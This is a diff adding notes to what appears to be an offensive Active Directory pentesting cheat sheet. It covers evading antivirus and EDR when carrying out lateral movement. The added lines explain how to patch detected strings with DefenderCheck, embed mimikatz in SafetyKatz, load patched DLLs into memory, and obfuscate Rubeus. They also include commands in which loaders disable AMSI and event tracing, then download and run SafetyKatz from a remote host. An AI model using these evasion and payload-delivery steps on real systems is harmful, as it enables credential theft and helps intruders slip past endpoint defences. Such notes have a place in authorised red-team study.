@@ -659,9 +659,42 @@ Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
 
 - **Lateral movement with .NET Tools:**
 ```powershell
+# Better than powershell but still detected by AV/EDR. There are two main problems here:
+1. Prevent detection by obfuscation
+2. Find a way to deliver the payload without getting caught
 ```
 
+- *Obfuscation*
+```powershell
+# Evasion is usually done by
+- compile the source
+- use Defendercheck.exe to identify detected strings
+- find a way to replace the malicious strings with a safer version ("Credentials" -> "Credents", etc...)
+- Compile and repeat the procedure
 
+# Some examples of obfuscation:
+
+# Out-CompressedDll.ps1 can help to generate a base64 representtaion of DLL or an EXE
+# Can be used to embed mimikatz into SafetyKatz
+Out-CompressedDll mimikatz.exe > output.txt
+# Paste it into Costant.cs and compile as SafetyKatz
+
+# BettersafetyKatz:
+# get the mimikatz binary code from github and unzip it in RAM
+# use defendercheck on it and patches the detected strings
+# Then use Sharpsploit DInvoke API to load the patched DLL into Memory
+
+# ConfuserEX can be used to obfuscate Rubeus
+```
+
+- *Payload Delivery*
+```powershell
+# A tool called Netloader can be used to patch AMSI & EWT (Event Viewer)
+c:\tools\Loader.exe -path http://x.x.x.x/SafetyKatz.exe
+
+# If loader.exe gets caught it's possible to use AssemblyLoad.exe to load loader.exe from network
+ c:\tools\AssemblyLoad.exe http://x.x.x.x/Loader.exe -path http://x.x.x.x/SafetyKatz.exe
+```
 
 - **Invoke-Mimikatz:**
 ```powershell
